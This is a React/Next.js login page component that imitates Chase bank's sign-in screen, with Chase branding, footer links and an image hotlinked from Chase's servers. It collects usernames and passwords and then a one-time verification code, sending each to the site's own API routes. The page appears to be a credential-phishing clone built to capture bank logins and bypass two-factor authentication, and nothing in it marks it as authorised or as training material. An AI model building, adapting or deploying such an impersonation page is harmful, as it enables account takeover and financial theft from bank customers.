"use client";

import { useState } from "react";
import { AlertTriangle, ChevronRight, Lock } from "lucide-react";
import BankLogo from "@/components/BankLogo";

export default function LoginPage() {
  const [step, setStep] = useState("login");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");
  const [maskedEmail, setMaskedEmail] = useState("");

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [otp, setOtp] = useState("");
  const [rememberMe, setRememberMe] = useState(false); // Track checkbox state

  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Enter your username and password.");
      return;
    }
    
    setError("");
    setIsLoading(true);
    
    try {
      const res = await fetch("/api/auth/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password })
      });
      
      const data = await res.json();
      
      if (!res.ok) {
        setError(data.error || "Login failed");
        setIsLoading(false);
        return;
      }
      
      // If the API says we don't need an OTP, redirect immediately!
      if (data.requiresOtp === false) {
        window.location.href = "/dashboard";
        return;
      }
      
      setMaskedEmail(data.maskedEmail);
      setStep("otp");
    } catch (err) {
      setError("Network error. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length < 6) return;

    setError("");
    setIsLoading(true);

    try {
      const res = await fetch("/api/auth/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, otp, rememberMe }) // Send checkbox state
      });
      
      const data = await res.json();
      
      if (!res.ok) {
        setError(data.error || "Invalid code");
        setIsLoading(false);
        return;
      }
      
      window.location.href = "/dashboard";
    } catch (err) {
      setError("Network error. Please try again.");
      setIsLoading(false);
    }
  };

  return (
    <div className="flex flex-col h-full w-full bg-white overflow-y-auto">
      <div 
        className="h-48 relative flex-shrink-0 bg-cover bg-center"
        style={{ backgroundImage: "url('https://asset.chase.com/content/services/rendition/image.xsmall.jpg/structured-images/geo-images/background/new_york/new_york_night_6.jpg')" }}
      >
        <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-transparent to-transparent"></div>
        <div className="absolute top-6 left-1/2 -translate-x-1/2 flex items-center justify-center">
          <div className="bg-[#0b5cba] text-white font-bold text-xl px-4 py-2 rounded-sm tracking-wider shadow-md flex items-center gap-2">
            CHASE
            <BankLogo className="w-6 h-6 text-white" />
          </div>
        </div>
      </div>

      <div className="flex-1 px-4 -mt-10 relative z-10 pb-8">
        <div className="bg-white rounded shadow-lg border border-gray-100 p-6 w-full">
          
          {step === "login" && (
            <form onSubmit={handleLoginSubmit} className="space-y-6 animate-in fade-in duration-300">
              {error && (
                <div className="bg-red-50 text-red-700 p-3 rounded text-sm flex items-start gap-2 border border-red-200">
                  <AlertTriangle className="w-4 h-4 mt-0.5 shrink-0" />
                  <span>{error}</span>
                </div>
              )}

              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => { setUsername(e.target.value); if (error) setError(""); }}
                  className={`block w-full pt-6 pb-2 text-gray-900 bg-transparent border-b-2 appearance-none focus:outline-none focus:ring-0 peer ${error ? 'border-red-600' : 'border-gray-300 focus:border-[#0b5cba]'}`}
                  placeholder=" "
                />
                <label className={`absolute text-sm duration-300 transform -translate-y-4 scale-75 top-5 z-10 origin-[0] peer-focus:text-[#0b5cba] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 ${error ? 'text-red-600' : 'text-gray-500'}`}>
                  Username
                </label>
              </div>

              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => { setPassword(e.target.value); if (error) setError(""); }}
                  className={`block w-full pt-6 pb-2 text-gray-900 bg-transparent border-b-2 appearance-none focus:outline-none focus:ring-0 peer ${error ? 'border-red-600' : 'border-gray-300 focus:border-[#0b5cba]'}`}
                  placeholder=" "
                />
                <label className={`absolute text-sm duration-300 transform -translate-y-4 scale-75 top-5 z-10 origin-[0] peer-focus:text-[#0b5cba] peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 ${error ? 'text-red-600' : 'text-gray-500'}`}>
                  Password
                </label>
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-0 bottom-2 text-[#0b5cba] text-sm font-medium hover:underline"
                >
                  {showPassword ? "Hide" : "Show"}
                </button>
              </div>

              <div className="flex justify-between items-center text-sm text-gray-600 pt-2">
                <label className="flex items-center gap-2 cursor-pointer">
                  <input 
                    type="checkbox" 
                    checked={rememberMe}
                    onChange={(e) => setRememberMe(e.target.checked)}
                    className="w-4 h-4 rounded border-gray-300 text-[#0b5cba] focus:ring-[#0b5cba]" 
                  />
                  Remember this device
                </label>
              </div>

              <div className="pt-4 space-y-4">
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full bg-[#0b5cba] text-white font-semibold py-3.5 rounded hover:bg-[#094a96] transition-colors disabled:opacity-70 flex justify-center items-center"
                >
                  {isLoading ? <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span> : "Sign in"}
                </button>
                
                <div className="relative flex items-center justify-center my-4">
                  <div className="border-t border-gray-300 w-full"></div>
                  <span className="bg-white px-3 text-sm text-gray-500 absolute">Or</span>
                </div>

                <button
                  type="button"
                  className="w-full bg-white text-[#0b5cba] border border-[#0b5cba] font-semibold py-3.5 rounded hover:bg-gray-50 transition-colors"
                >
                  Passwordless sign in
                </button>
              </div>
            </form>
          )}

          {step === "otp" && (
            <form onSubmit={handleOtpSubmit} className="space-y-6 animate-in slide-in-from-right duration-300">
              <div className="text-center mb-6">
                <div className="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3">
                  <Lock className="w-6 h-6 text-[#0b5cba]" />
                </div>
                <h2 className="text-xl font-semibold text-gray-900">Verify your identity</h2>
                <p className="text-sm text-gray-500 mt-2">
                  We sent a temporary identification code to your registered email address ending in <span className="font-bold text-gray-900">{maskedEmail}</span>.
                </p>
              </div>

              {error && (
                <div className="bg-red-50 text-red-700 p-3 rounded text-sm text-center border border-red-200">
                  {error}
                </div>
              )}

              <div className="relative">
                <input
                  type="text"
                  maxLength="6"
                  value={otp}
                  onChange={(e) => { setOtp(e.target.value.replace(/\D/g, '')); if (error) setError(""); }}
                  className={`block w-full pt-6 pb-2 text-center tracking-[0.5em] text-2xl font-semibold text-gray-900 bg-transparent border-b-2 appearance-none focus:outline-none peer ${error ? 'border-red-600 focus:border-red-600' : 'border-gray-300 focus:border-[#0b5cba]'}`}
                  placeholder=" "
                  autoFocus
                />
                <label className={`absolute text-sm duration-300 transform -translate-y-4 scale-75 top-5 z-10 origin-[0] left-1/2 -translate-x-1/2 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 peer-focus:scale-75 peer-focus:-translate-y-4 ${error ? 'text-red-600 peer-focus:text-red-600' : 'text-gray-500 peer-focus:text-[#0b5cba]'}`}>
                  Identification Code
                </label>
              </div>

              <button
                type="submit"
                disabled={otp.length < 6 || isLoading}
                className="w-full bg-[#0b5cba] text-white font-semibold py-3.5 rounded hover:bg-[#094a96] transition-colors disabled:bg-gray-300 disabled:text-gray-500 flex justify-center items-center mt-8"
              >
                {isLoading ? <span className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></span> : "Verify & Sign in"}
              </button>

              <button 
                type="button" 
                onClick={() => { setStep("login"); setOtp(""); setError(""); }}
                className="w-full text-center text-[#0b5cba] text-sm font-medium hover:underline mt-4"
              >
                Cancel and return to login
              </button>
            </form>
          )}
          <div className="bg-[#f4f5f9] pt-8 pb-12 px-4 border-t border-gray-200 mt-auto">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-3 text-xs text-gray-500 font-medium text-center">
          <a href="#" className="hover:underline">Contact us</a>
          <a href="#" className="hover:underline">Privacy & security</a>
          <a href="#" className="hover:underline">Terms of use</a>
          <a href="#" className="hover:underline">Accessibility</a>
          <a href="#" className="hover:underline">SAFE Act: Chase Mortgage</a>
          <a href="#" className="hover:underline">Fair Lending</a>
          <a href="#" className="hover:underline">About Chase</a>
          <a href="#" className="hover:underline">J.P. Morgan</a>
        </div>
      </div>
        </div>
      </div>
    </div>
  );
}